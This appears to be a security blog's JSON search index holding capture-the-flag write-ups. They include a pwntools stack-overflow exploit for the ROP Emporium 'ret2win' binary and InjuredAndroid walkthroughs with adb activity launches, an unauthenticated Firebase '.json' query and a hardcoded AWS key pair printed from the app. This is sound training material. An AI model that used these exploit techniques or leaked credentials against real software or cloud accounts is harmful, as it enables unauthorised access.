[{"content":"","date":"2021-12-20T20:50:44+03:00","permalink":"https://thuri10.github.io/p/return-oriented-programming-retcsu/","title":"Return-Oriented Programming - Retcsu"},{"content":"","date":"2021-12-20T20:50:30+03:00","permalink":"https://thuri10.github.io/p/return-oriented-programming-pivot/","title":"Return-Oriented Programming - Pivot"},{"content":"","date":"2021-12-20T20:50:20+03:00","permalink":"https://thuri10.github.io/p/return-oriented-programming-fluff/","title":"Return-Oriented Programming - Fluff"},{"content":"","date":"2021-12-20T20:50:06+03:00","permalink":"https://thuri10.github.io/p/return-oriented-programming-badchars/","title":"Return-Oriented Programming - Badchars"},{"content":"","date":"2021-12-20T20:49:54+03:00","permalink":"https://thuri10.github.io/p/return-oriented-programming-write4/","title":"Return-Oriented Programming - Write4"},{"content":"","date":"2021-12-20T20:49:43+03:00","permalink":"https://thuri10.github.io/p/return-oriented-programming-callme/","title":"Return-Oriented Programming - Callme"},{"content":"disassembling of the usefulfunction in the binary\n(gdb) disas usefulFunction Dump of assembler code for function usefulFunction: 0x0000000000400742 \u0026lt;+0\u0026gt;:\tpush rbp 0x0000000000400743 \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x0000000000400746 \u0026lt;+4\u0026gt;:\tmov edi,0x40084a 0x000000000040074b \u0026lt;+9\u0026gt;:\tcall 0x400560 \u0026lt;system@plt\u0026gt; 0x0000000000400750 \u0026lt;+14\u0026gt;:\tnop 0x0000000000400751 \u0026lt;+15\u0026gt;:\tpop rbp 0x0000000000400752 \u0026lt;+16\u0026gt;:\tret End of assembler dump. (gdb) x/s 0x40084a 0x40084a:\t\u0026#34;/bin/ls\u0026#34; (gdb) let look at the strings in order to get useful strings for our case. The goal is to read the flag from the system.\n[0x004005b0]\u0026gt; iz [Strings] nth paddr vaddr len size section type string ――――――――――――――――――――――――――――――――――――――――――――――――――――――― 0 0x000007e8 0x004007e8 21 22 .rodata ascii split by ROP Emporium 1 0x000007fe 0x004007fe 7 8 .rodata ascii x86_64\\n 2 0x00000806 0x00400806 8 9 .rodata ascii \\nExiting 3 0x00000810 0x00400810 43 44 .rodata ascii Contriving a reason to ask user for data... 4 0x0000083f 0x0040083f 10 11 .rodata ascii Thank you! 5 0x0000084a 0x0040084a 7 8 .rodata ascii /bin/ls 0 0x00001060 0x00601060 17 18 .data ascii /bin/cat flag.txt using radare2 to get strings of the binary we have now an important string \u0026ldquo;/bin/cat flag.txt\u0026rdquo;\nwe need to chain our rop to be like system('/bin/cat flag.txt')\n","date":"2021-12-20T20:49:37+03:00","permalink":"https://thuri10.github.io/p/return-oriented-programming-split/","title":"Return-Oriented Programming - Split"},{"content":"Introduction GOAL: Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.\nfind the address of the ret2win and determine the size of the buffer by looking at the gdb.\n(gdb) info functions All defined functions: Non-debugging symbols: 0x0000000000400528 _init 0x0000000000400550 puts@plt 0x0000000000400560 system@plt 0x0000000000400570 printf@plt 0x0000000000400580 memset@plt 0x0000000000400590 read@plt 0x00000000004005a0 setvbuf@plt 0x00000000004005b0 _start 0x00000000004005e0 _dl_relocate_static_pie 0x00000000004005f0 deregister_tm_clones 0x0000000000400620 register_tm_clones 0x0000000000400660 __do_global_dtors_aux 0x0000000000400690 frame_dummy 0x0000000000400697 main 0x00000000004006e8 pwnme 0x0000000000400756 ret2win 0x0000000000400780 __libc_csu_init 0x00000000004007f0 __libc_csu_fini 0x00000000004007f4 _fini (gdb) from the disassembly of the pwnme function, we can determine the size of the buffer we reading to.\n(gdb) disas pwnme Dump of assembler code for function pwnme: 0x00000000004006e8 \u0026lt;+0\u0026gt;:\tpush rbp 0x00000000004006e9 \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x00000000004006ec \u0026lt;+4\u0026gt;:\tsub rsp,0x20 0x00000000004006f0 \u0026lt;+8\u0026gt;:\tlea rax,[rbp-0x20] 0x00000000004006f4 \u0026lt;+12\u0026gt;:\tmov edx,0x20 0x00000000004006f9 \u0026lt;+17\u0026gt;:\tmov esi,0x0 0x00000000004006fe \u0026lt;+22\u0026gt;:\tmov rdi,rax 0x0000000000400701 \u0026lt;+25\u0026gt;:\tcall 0x400580 \u0026lt;memset@plt\u0026gt; 0x0000000000400706 \u0026lt;+30\u0026gt;:\tmov edi,0x400838 0x000000000040070b \u0026lt;+35\u0026gt;:\tcall 0x400550 \u0026lt;puts@plt\u0026gt; 0x0000000000400710 \u0026lt;+40\u0026gt;:\tmov edi,0x400898 0x0000000000400715 \u0026lt;+45\u0026gt;:\tcall 0x400550 \u0026lt;puts@plt\u0026gt; 0x000000000040071a \u0026lt;+50\u0026gt;:\tmov edi,0x4008b8 0x000000000040071f \u0026lt;+55\u0026gt;:\tcall 0x400550 \u0026lt;puts@plt\u0026gt; 0x0000000000400724 \u0026lt;+60\u0026gt;:\tmov edi,0x400918 0x0000000000400729 \u0026lt;+65\u0026gt;:\tmov eax,0x0 0x000000000040072e \u0026lt;+70\u0026gt;:\tcall 0x400570 \u0026lt;printf@plt\u0026gt; 0x0000000000400733 \u0026lt;+75\u0026gt;:\tlea rax,[rbp-0x20] 0x0000000000400737 \u0026lt;+79\u0026gt;:\tmov edx,0x38 0x000000000040073c \u0026lt;+84\u0026gt;:\tmov rsi,rax 0x000000000040073f \u0026lt;+87\u0026gt;:\tmov edi,0x0 0x0000000000400744 \u0026lt;+92\u0026gt;:\tcall 0x400590 \u0026lt;read@plt\u0026gt; 0x0000000000400749 \u0026lt;+97\u0026gt;:\tmov edi,0x40091b 0x000000000040074e \u0026lt;+102\u0026gt;:\tcall 0x400550 \u0026lt;puts@plt\u0026gt; 0x0000000000400753 \u0026lt;+107\u0026gt;:\tnop 0x0000000000400754 \u0026lt;+108\u0026gt;:\tleave 0x0000000000400755 \u0026lt;+109\u0026gt;:\tret End of assembler dump. from the above code, we are have a buffer of size 0x20(32bytes), but we are reading the more than the buffer thus doing a stack buffer overflow.\nour exploit for ret2win challenge is\nimport pwn pwn.context.encoding = \u0026#34;latin-1\u0026#34; pwn.warnings.simplefilter(\u0026#34;ignore\u0026#34;) pwn.context.arch = \u0026#34;amd64\u0026#34; io = pwn.process(\u0026#39;./ret2win\u0026#39;) payload = b\u0026#34;A\u0026#34; * 32 # fill the buffer payload += b\u0026#34;B\u0026#34; * 8 #overwrite saved base pointer payload += pwn.p64(0x400756) #Address of ret2win function io.writeafter(\u0026#39;\u0026gt;\u0026#39;, payload) pwn.info(io.clean().decode()) running the script above we get the flag as shown below.\nvx@archie:ret2win$ python3 x.py [+] Starting local process \u0026#39;./ret2win\u0026#39;: pid 45427 [*] Thank you! Well done! Here\u0026#39;s your flag: ROPE{a_placeholder_32byte_flag!} [*] Process \u0026#39;./ret2win\u0026#39; stopped with exit code 0 (pid 45427) ","date":"2021-12-20T20:49:23+03:00","permalink":"https://thuri10.github.io/p/return-oriented-programming-ret2win/","title":"Return-Oriented Programming - Ret2win"},{"content":"the sample for analysis is Anubis sha256 of the sample is: edda95f68c0cdf9f4c13e4e35211b42666c014f2c0831210b59296071139f159\nsteps for analysis malware\n decompilation static analysis of manifest files to understand file name, permissions , etc   ","date":"2021-12-12T19:02:05+03:00","permalink":"https://thuri10.github.io/p/android-malware-analysis-series/","title":"Android Malware analysis series"},{"content":"","date":"2021-12-07T19:02:36+03:00","permalink":"https://thuri10.github.io/p/ransomware/","title":"Analyzing Ransomware Malware challenge"},{"content":"","date":"2021-12-07T19:02:24+03:00","permalink":"https://thuri10.github.io/p/reversing-custom-bytecode-virtual-machine/","title":"Reversing Custom Bytecode Virtual Machine"},{"content":"","date":"2021-12-07T19:02:13+03:00","permalink":"https://thuri10.github.io/p/static-analysis-of-malware-strings/","title":"Static analysis of Malware Strings"},{"content":"Introduction  show how to scan the application for default keys how to use nuclei regular expressions example of scanning for deeplinks application in an application. sanning manifest file for deeplinks.   Introduction ","date":"2021-11-03T15:54:03+03:00","permalink":"https://thuri10.github.io/p/android-application-security-part4/","title":"Android Application Security Part4"},{"content":"","date":"2021-10-27T15:53:59+03:00","permalink":"https://thuri10.github.io/p/android-application-security-part-3/","title":"Android Application security Part 3"},{"content":"Insecure Storages This is the second part of the android application security. This part focuses on the local sqlite databases, firebase and AWS security.\nFlag7 - Sqlite This is level is about understanding the sqlite local database in the applications folder.\npublic FlagSevenSqliteActivity() { byte[] bArr = this.x; //sqlite  d.m.b.d.b(bArr, \u0026#34;decodedDirectoryOne\u0026#34;); Charset charset = StandardCharsets.UTF_8; d.m.b.d.b(charset, \u0026#34;StandardCharsets.UTF_8\u0026#34;); this.z = new String(bArr, charset); byte[] bArr2 = this.y; //f1ag-pa55  d.m.b.d.b(bArr2, \u0026#34;decodedDirectoryTwo\u0026#34;); Charset charset2 = StandardCharsets.UTF_8; d.m.b.d.b(charset2, \u0026#34;StandardCharsets.UTF_8\u0026#34;); this.A = new String(bArr2, charset2); f b2 = f.b(); d.m.b.d.b(b2, \u0026#34;FirebaseDatabase.getInstance()\u0026#34;); d d2 = b2.d(); d.m.b.d.b(d2, \u0026#34;FirebaseDatabase.getInstance().reference\u0026#34;); this.B = d2; d h = d2.h(this.z); d.m.b.d.b(h, \u0026#34;database.child(refDirectory)\u0026#34;); this.C = h; d h2 = this.B.h(this.A); d.m.b.d.b(h2, \u0026#34;database.child(refDirectoryTwo)\u0026#34;); this.D = h2; } on looking at the oncreate method define in the flag7 activity.from the code below , we are creating a database called Thisislatest.db\npublic void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_flag_seven_sqlite); C((Toolbar) findViewById(R.id.toolbar)); j.g.a(this); H(); ((FloatingActionButton) findViewById(R.id.fab)).setOnClickListener(new a()); SQLiteDatabase writableDatabase = this.u.getWritableDatabase(); ContentValues contentValues = new ContentValues(); contentValues.put(\u0026#34;title\u0026#34;, Base64.decode(\u0026#34;VGhlIGZsYWcgaGFzaCE=\u0026#34;, 0)); contentValues.put(\u0026#34;subtitle\u0026#34;, Base64.decode(\u0026#34;MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc=\u0026#34;, 0)); writableDatabase.insert(\u0026#34;Thisisatest\u0026#34;, null, contentValues); contentValues.put(\u0026#34;title\u0026#34;, Base64.decode(\u0026#34;VGhlIGZsYWcgaXMgYWxzbyBhIHBhc3N3b3JkIQ==\u0026#34;, 0)); contentValues.put(\u0026#34;subtitle\u0026#34;, h.c()); writableDatabase.insert(\u0026#34;Thisisatest\u0026#34;, null, contentValues); } FLag8 - AWS Storage and Security. This level is about learing AWS storage and security.\npublic FlagEightLoginActivity() { f b2 = f.b(); d.m.b.d.b(b2, \u0026#34;FirebaseDatabase.getInstance()\u0026#34;); d d2 = b2.d(); d.m.b.d.b(d2, \u0026#34;FirebaseDatabase.getInstance().reference\u0026#34;); this.u = d2; d h = d2.h(\u0026#34;/aws\u0026#34;); d.m.b.d.b(h, \u0026#34;database.child(\\\u0026#34;/aws\\\u0026#34;)\u0026#34;); this.v = h; } clicking on the onclick method in the source code., as shown in the code snippet below.\npublic final void onClick(View view) { if (FlagEightLoginActivity.this.H() == 0) { if (view != null) { Snackbar X = Snackbar.X(view, \u0026#34;AWS CLI.\u0026#34;, 0); X.Y(\u0026#34;Action\u0026#34;, null); X.N(); FlagEightLoginActivity flagEightLoginActivity = FlagEightLoginActivity.this; flagEightLoginActivity.I(flagEightLoginActivity.H() + 1); return; } d.m.b.d.k(); throw null; } else if (FlagEightLoginActivity.this.H() != 1) { } else { if (view != null) { Snackbar X2 = Snackbar.X(view, \u0026#34;AWS profiles and credentials.\u0026#34;, 0); X2.Y(\u0026#34;Action\u0026#34;, null); X2.N(); FlagEightLoginActivity.this.I(0); return; } d.m.b.d.k(); throw null; } } from the hint above on to use AWS CLI. Now let look for AWS profiles and credentials in the application.\nMost of the strings in an android application are located at the strings.xml file in the res directory. in the strings.xml file we have two intresting strings as shown in the code snippet.\n\u0026lt;string name=\u0026#34;AWS_ID\u0026#34;\u0026gt;AKIAZ36DGKTUIOLDOBN6\u0026lt;/string\u0026gt; \u0026lt;string name=\u0026#34;AWS_SECRET\u0026#34;\u0026gt;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\u0026lt;/string\u0026gt; show how to use AWS cli to get the flag.\nFlag9- FireBase This challenge is about understanding firebase realtime database rules.\npublic final void goToFlagNineFirebaseActivity(View view) { startActivity(new Intent(this, FlagNineFirebaseActivity.class)); } We start our analysis in the main activity, for the level nine is defined in FlagNineFirebaseActivity. Let analyze the level nine security.\npublic FlagNineFirebaseActivity() { byte[] decode = Base64.decode(\u0026#34;ZmxhZ3Mv\u0026#34;, 0); // flags/  this.v = decode; d.m.b.d.b(decode, \u0026#34;decodedDirectory\u0026#34;); Charset charset = StandardCharsets.UTF_8; d.m.b.d.b(charset, \u0026#34;StandardCharsets.UTF_8\u0026#34;); this.w = new String(decode, charset); f b2 = f.b(); d.m.b.d.b(b2, \u0026#34;FirebaseDatabase.getInstance()\u0026#34;); d d2 = b2.d(); d.m.b.d.b(d2, \u0026#34;FirebaseDatabase.getInstance().reference\u0026#34;); this.x = d2; d h = d2.h(this.w); d.m.b.d.b(h, \u0026#34;database.child(refDirectory)\u0026#34;); this.y = h; } we can decode the base64 encoded strings in the above code to understand what is happening as shown in the code above.\nclicking on the hint button, we get an hint on what to do as shown in the code below.\npublic final void onClick(View view) { String str; if (FlagNineFirebaseActivity.this.H() == 0) { if (view != null) { str = \u0026#34;Use the .json trick with database url\u0026#34;; } else { d.m.b.d.k(); throw null; } } else if (FlagNineFirebaseActivity.this.H() == 1) { if (view != null) { str = \u0026#34;Filenames.\u0026#34;; } else { d.m.b.d.k(); throw null; } let now look for the database url in the strings.xml\n\u0026lt;string name=\u0026#34;firebase_database_url\u0026#34;\u0026gt;https://injuredandroid.firebaseio.com\u0026lt;/string\u0026gt; the firebase node we are interested is the flags node. to check if the endpoint or the node is vulnerable is to add a .json as shown in the image below.\nvx@archie:injured$ curl https://injuredandroid.firebaseio.com/flags/.json \u0026#34;[nine!_flag]\u0026#34; Adding a .json extension in our url, we get a flag for our application.\n","date":"2021-10-25T15:53:55+03:00","image":"https://thuri10.github.io/firebase.jpg","permalink":"https://thuri10.github.io/p/android-application-security-part2/","title":"Android Application Security Part2"},{"content":"Introduction This is a five part beginner series of Android application security with Vulnerable Android application examples. The application used in the first three part series is a vulnerable Android application developed by @B3nac.\nThe application is InjuredAndroid, it covers different security concepts such as hardcoded secrets, weak cryptographic algorithms, misconfiguration etc. The application can be downloaded from the following provided links playstore or from github.\nInorder to solve the challenges or follow through the guides is you need to have an android phone or an emulator. I will be using an android emulator throughout the series, my emulator of choice is android emulator which is part of android studio.\nEnviroment setup and decompilation For installation of application to the emulator we will use Android debug bridge(adb). adb is a set of command line tools which are installed as part of android studio. adb enables communication between emulator/real android phone with connected computer.\nTo install the application, use install command as shown in the Linux terminal below.\nadb install InjuredAndroid-1.0.12-release.apk Launching the application in the emulator ,the interface will look like the image below.\n InjuredAndroid \nTools used throughout the series are:\n JADX Text Editor (visual studio) Android Studio  JADX is a bundle of command line and GUI tools.jadx enables one to produce java source code from android Dex and APK files. This will aid us to decompile the android application to java code which is human readable.\n For reverse engineering/ code auditing of every application, you need to have a clear set of goal or objective of what you want to achieve. This helps narrow down the analysis and avoid many rabbit holes.\n FLAG ONE - LOGIN Goal : Input the right flag.\nFor the first challenge is to get the correct flag. flag is a piece of reward if you do correct task you are asked to do. Looking at the decompiled code in the editor as shown below, there is an interesting function called submitFlag. submit flag function is responsible for validation of the user input.\npublic final void submitFlag(View view) { EditText editText = (EditText) findViewById(R.id.editText2); C2724g.m882d(editText, \u0026#34;editText2\u0026#34;); if (C2724g.m885a(editText.getText().toString(), \u0026#34;F1ag_0n3\u0026#34;)) { Intent intent = new Intent(this, FlagOneSuccess.class); new FlagsOverview().m4085J(true); new ApplicationC1492j().m4065b(this, \u0026#34;flagOneButtonColor\u0026#34;, true); startActivity(intent); } } From the above code, the FlagoneActivity class implements a functionality which the user input is compared with hardcoded flag in the application.\nThe user entered flag string is compared with the hardcoded flag which is \u0026ldquo;F1ag_0n3\u0026rdquo;. The class m10785a compares the two objects ( user input flag and hardcoded flag) and return a boolean depending on the result of the comparison of two objects. A boolean result can be either true or false.\npublic static boolean m10785a(Object obj, Object obj2) { return obj == null ? obj2 == null : obj.equals(obj2); } If the condition is True, new Intent is started which is FlagOneSuccess. Entering hardcoded flag as our input, we get a success message and color of Flag1 in flagsOverview Activity changes to green, meaning we have successfully solved the challenge1.\n Flag one solved \nThe flag for level1 is \u0026ldquo;F1ag_0n3\u0026rdquo;.\nFor other levels if solved successfully, the color of the flag corresponding to that level will change to green.\nFLAG TWO - EXPORTED ACTIVITY Goal : There is a way to bypass the main activity and invoke other activities that are exported.\nwhat is an activity?\nAn activity is a single, focused thing that the user can do. It is an application component that provide a user Interface for users to interact with.\nLooking at the flagtwoactivity, the source code looks like the one shown below.\npublic class FlagTwoActivity extends ActivityC0453c { /* renamed from: w */ int f4461w = 0; /* renamed from: F */ public /* synthetic */ void m4090F(View view) { int i = this.f4461w; if (i == 0) { Snackbar X = Snackbar.m2647X(view, \u0026#34;Key words Activity and exported.\u0026#34;, 0); X.m2646Y(\u0026#34;Action\u0026#34;, null); X.mo2650N(); this.f4461w++; } else if (i == 1) { Snackbar X2 = Snackbar.m2647X(view, \u0026#34;Exported Activities can be accessed with adb or Drozer.\u0026#34;, 0); X2.m2646Y(\u0026#34;Action\u0026#34;, null); X2.mo2650N(); this.f4461w = 0; } } /* access modifiers changed from: protected */ @Override // androidx.appcompat.app.ActivityC0453c, androidx.fragment.app.ActivityC0797d, androidx.activity.ComponentActivity, androidx.core.app.ActivityC0714e, android.app.Activity  public void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_flag_two); m8078C((Toolbar) findViewById(R.id.toolbar)); ((FloatingActionButton) findViewById(R.id.fab)).setOnClickListener(new View.OnClickListener() { // from class: b3nac.injuredandroid.d  @Override // android.view.View.OnClickListener  public final void onClick(View view) { FlagTwoActivity.this.m4090F(view); } }); } } The oncreate method is used for initializing our activity. The goal of the challenge is to invoke the flagtwoactivity from an external application. This activity is called exported activity, meaning it can be started outside the context of the application.\nActivities in android are defined in a file called AndroidManifest.xml .\n\u0026lt;activity android:name=\u0026#34;b3nac.injuredandroid.b25lActivity\u0026#34; android:exported=\u0026#34;true\u0026#34;/\u0026gt; As you see above, the activity b3nac.injuredandroid.b25lActivity can be invoked by external application because android:exported attribute is set to true.\nFor exploitation of the above issue we will use adb. First we use adb to list the installed packages in the device and grep the application of our interest using Linux grep utility.\nvx@archie:~$ adb shell pm list packages | grep injuredandroid package:b3nac.injuredandroid what happens when invoke b25lActivity class activity?\nWhen b25lActivity activity is invoked by an external program, it sets the flag2 color to green in the FlagsOverview activity.\n/* loaded from: classes.dex */ public final class b25lActivity extends ActivityC0453c { /* access modifiers changed from: protected */ @Override // androidx.appcompat.app.ActivityC0453c, androidx.fragment.app.ActivityC0797d, androidx.activity.ComponentActivity, androidx.core.app.ActivityC0714e, android.app.Activity  public void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_b25l); ApplicationC1492j.f4506j.m4062a(this); new FlagsOverview().m4082M(true); new ApplicationC1492j().m4065b(this, \u0026#34;flagTwoButtonColor\u0026#34;, true); } } Invoke the activity b25lActivity using adb\nvx@archie:~$ adb shell am start -n b3nac.injuredandroid/.b25lActivity Starting: Intent { cmp=b3nac.injuredandroid/.b25lActivity } We successfully start Flag two activity and we are rewarded with a flag.\n Flag two \nFLAG THREE - RESOURCES Goal: Understanding how an application references Resources.\nwhat are resources?\nResources are used for anything from defining colors, images, layouts, menus and string values. Everything defined here is referenced in the application`s code.\nThe decompiled code for FlagThreeActivity is as shown below.\npublic final void submitFlag(View view) { EditText editText = (EditText) findViewById(R.id.editText2); C2724g.m882d(editText, \u0026#34;editText2\u0026#34;); if (C2724g.m885a(editText.getText().toString(), getString(R.string.cmVzb3VyY2VzX3lv))) { Intent intent = new Intent(this, FlagOneSuccess.class); new FlagsOverview().m4083L(true); new ApplicationC1492j().m4065b(this, \u0026#34;flagThreeButtonColor\u0026#34;, true); startActivity(intent); } } Looking at the above submitFlag function defined in FlagThreeActivity.java, we arecomparing the user input with the value referenced at Resource cmVzb3VyY2VzX3lv . R stands for resource.\nLooking at the strings we get our flags as referenced by the string above.\n\u0026lt;string name=\u0026#34;cmVzb3VyY2VzX3lv\u0026#34;\u0026gt;F1ag_thr33\u0026lt;/string\u0026gt; The flag is F1ag_thr33\nFLAG FOUR - LOGIN2 Goal: Get the right flag\nFor flag four we analyze FlagFourActivity.java.. First we need figure out the logic implemented in the submitflag class in the code below.\npublic final void submitFlag(View view) { EditText editText = (EditText) findViewById(R.id.editText2); C2724g.m882d(editText, \u0026#34;editText2\u0026#34;); String obj = editText.getText().toString(); byte[] a = new C1489g().m4070a(); C2724g.m882d(a, \u0026#34;decoder.getData()\u0026#34;); if (C2724g.m885a(obj, new String(a, C2759c.f6854a))) { Intent intent = new Intent(this, FlagOneSuccess.class); new FlagsOverview().m4086I(true); new ApplicationC1492j().m4065b(this, \u0026#34;flagFourButtonColor\u0026#34;, true); startActivity(intent); } } From the above,we are are getting user input and comparing with bytes in variable a. To understand the logic we analyze the class c1489g and member class m4070a.\npublic class C1489g { /* renamed from: a */ private byte[] f4499a = Base64.decode(\u0026#34;NF9vdmVyZG9uZV9vbWVsZXRz\u0026#34;, 0); /* renamed from: a */ public byte[] m4070a() { return this.f4499a; } Looking at the public class c1489g, it implements base64 decoding of the byte string and returned to the submitFlag class .\nTo get the string we are returning we need to decode the encoded string using base64 utility installed in linux .\n$ echo \u0026#34;NF9vdmVyZG9uZV9vbWVsZXRz\u0026#34; | base64 -d 4_overdone_omelets Our flag is : 4_overdone_omelets\nFLAG FIVE - EXPORTED BROADCAST RECEIVERS Goal: Understand how Broadcast receivers work\nApplications receive broadcasts in two ways:\n Through manifest-declared receivers. Context-registered receivers.  Manifest-declared receivers - This type causes the system to launch application when broadcast is received. Searching in AndroidManifest.xml file we get where our broadcast is declared.\n\u0026lt;receiver android:name=\u0026#34;b3nac.injuredandroid.FlagFiveReceiver\u0026#34; android:exported=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;activity android:theme=\u0026#34;@style/AppTheme.NoActionBar\u0026#34; android:label=\u0026#34;@string/title_activity_flag_five\u0026#34; android:name=\u0026#34;b3nac.injuredandroid.FlagFiveActivity\u0026#34;/\u0026gt; In order to understand the Broadcast receivers, we need to analyze the oncreate() method in the FlagFiveActivity.java file.\npublic void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_flag_five); m8078C((Toolbar) findViewById(R.id.toolbar)); ((FloatingActionButton) findViewById(R.id.fab)).setOnClickListener(new View.OnClickListener() { // from class: b3nac.injuredandroid.c  @Override // android.view.View.OnClickListener  public final void onClick(View view) { FlagFiveActivity.this.m4118G(view); } }); new ComponentName(this, FlagFiveReceiver.class); getPackageManager(); C0310a.m8404b(this).m8403c(this.f4409x, new IntentFilter(\u0026#34;com.b3nac.injuredandroid.intent.action.CUSTOM_INTENT\u0026#34;)); ((Button) findViewById(R.id.button9)).setOnClickListener(new View.OnClickListener() { // from class: b3nac.injuredandroid.b  @Override // android.view.View.OnClickListener  public final void onClick(View view) { FlagFiveActivity.this.m4117H(view); // invokes the intent  } }); } From the above code, when we click flag2 button, we invoke intent which is defined in class m4117H.\nAn intent is used to perfom an action on the screen. Therefore clicking the button element in our application we are invoking an new intent. Intents are used for sending a broadcast receiver.\n/* renamed from: H */ public /* synthetic */ void m4117H(View view) { m4119F(); } public void m4119F() { sendBroadcast(new Intent(\u0026#34;com.b3nac.injuredandroid.intent.action.CUSTOM_INTENT\u0026#34;)); } Looking at the component name FlagFiveReceiver class. when the intent is invoked twice, we receive our flag. The class implements a conditional if else loop for checking the number of intents. when the correct flag is displayed, the intents counter is set to zero( i2 = 0), where i2 variable is the intent counter as shown in the java code below.\npublic final class FlagFiveReceiver extends BroadcastReceiver { /* renamed from: a */ private static int f4410a; @Override // android.content.BroadcastReceiver  public void onReceive(Context context, Intent intent) { String str; int i; C2724g.m881e(context, \u0026#34;context\u0026#34;); C2724g.m881e(intent, \u0026#34;intent\u0026#34;); ApplicationC1492j.f4506j.m4062a(context); int i2 = f4410a; if (i2 == 0) { StringBuilder sb = new StringBuilder(); sb.append(C2765h.m809e(\u0026#34;\\n Action: \u0026#34; + intent.getAction() + \u0026#34;\\n\\n \u0026#34;)); sb.append(C2765h.m809e(\u0026#34;\\n URI: \u0026#34; + intent.toUri(1) + \u0026#34;\\n\\n \u0026#34;)); str = sb.toString(); C2724g.m882d(str, \u0026#34;sb.toString()\u0026#34;); Log.d(\u0026#34;DUDE!:\u0026#34;, str); } else { str = \u0026#34;Keep trying!\u0026#34;; if (i2 != 1) { if (i2 == 2) { new FlagsOverview().m4087H(true); new ApplicationC1492j().m4065b(context, \u0026#34;flagFiveButtonColor\u0026#34;, true); Toast.makeText(context, \u0026#34;You are a winner \u0026#34; + C1494k.m4061a(\u0026#34;Zkdlt0WwtLQ=\u0026#34;), 1).show(); i = 0; f4410a = i; } Toast.makeText(context, str, 1).show(); return; } } Toast.makeText(context, str, 1).show(); i = f4410a + 1; f4410a = i; } } onReceive method is responsible for receiving intents sent. Invoking our Activity two times we get a flag.\n Flag Five \nThe flag for challenge five is F1v3!\n","date":"2021-10-20T20:19:29+03:00","image":"https://thuri10.github.io/android.jpg","permalink":"https://thuri10.github.io/p/android-application-security-series-part-1/","title":"Android Application Security Series- Part 1"}]